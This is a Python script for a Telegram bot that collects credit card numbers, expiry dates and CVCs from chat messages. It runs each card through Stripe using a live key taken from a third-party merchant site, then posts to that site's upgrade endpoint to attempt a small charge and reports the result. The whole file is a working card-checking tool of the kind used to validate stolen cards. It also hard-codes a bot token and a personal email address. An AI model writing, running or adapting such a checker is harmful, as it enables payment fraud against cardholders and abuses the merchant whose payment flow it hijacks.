import telebot
import json
import requests

# Your Telegram bot token
BOT_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(BOT_TOKEN)

# Step 1: Handle /start command
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "Send your credit card details in one message:\n"
        "CARDNUMBER,MM,YY,CVC\n"
        "Example: 4147098797621083,10,28,202"
    )

# Step 2: Capture user input and process
@bot.message_handler(func=lambda message: True)
def handle_card_input(message):
    try:
        text = message.text.strip()
        parts = [p.strip() for p in text.split(',')]
        if len(parts) != 4:
            bot.send_message(message.chat.id, "Invalid format. Please send as: CARDNUMBER,MM,YY,CVC")
            return

        card_number, exp_month, exp_year, cvc = parts
        email = "peshangsalam2001@gmail.com"  # fixed email

        # Call the function to check card
        check_card_with_details(
            chat_id=message.chat.id,
            card_number=card_number,
            exp_month=exp_month,
            exp_year=exp_year,
            cvc=cvc,
            email=email
        )

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

def check_card_with_details(chat_id, card_number, exp_month, exp_year, cvc, email):
    # 1. Prepare POST data with user input
    post_data = {
        "type": "card",
        "billing_details[email]": email,
        "billing_details[address][postal_code]": "10080",
        "card[number]": card_number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "key": "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL"
    }

    # 2. Send POST request to first URL (Stripe API)
    first_url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        "host": "api.stripe.com",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2  Mobile/15E148 Safari/605.1.15"
    }

    response = requests.post(first_url, headers=headers, data=post_data)
    response_text = response.text
    print("First URL response:", response_text)  # Debug

    # Parse JSON and get pm_ id
    try:
        response_json = json.loads(response_text)
        pm_id = response_json.get("id")
        if not pm_id:
            bot.send_message(chat_id, "Failed to get payment method ID.")
            return
        print("Extracted pm_id:", pm_id)
    except Exception as e:
        bot.send_message(chat_id, "Error parsing response from first URL.")
        print("JSON parse error:", e)
        return

    # 3. Send pm_id to second URL
    second_url = "https://www.popularfintech.com/upgrade?_data=routes%2Fupgrade"
    headers2 = {
        "host": "www.popularfintech.com",
        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "sec-fetch-mode": "cors",
        "referer": "https://www.popularfintech.com/",
        "sentry-trace": "sample-trace-id"
    }
    data2 = {
        "email": email,
        "force_three_d_secure": "false",
        "price_id": "your_price_id",  # Replace if needed
        "payment_method": pm_id,
        "amount_cents": "100",
        "upgrade_error_message": "Oops%2C+something+went+wrong.",
        "upgrade_success_message": "You+are+a+premium+subscriber"
    }

    second_response = requests.post(second_url, headers=headers2, data=data2)
    second_response_text = second_response.text
    print("Second URL response:", second_response_text)  # Debug

    # 4. Show the second URL response
    bot.send_message(chat_id, f"Website response:\n{second_response_text}")

# Run bot
bot.polling()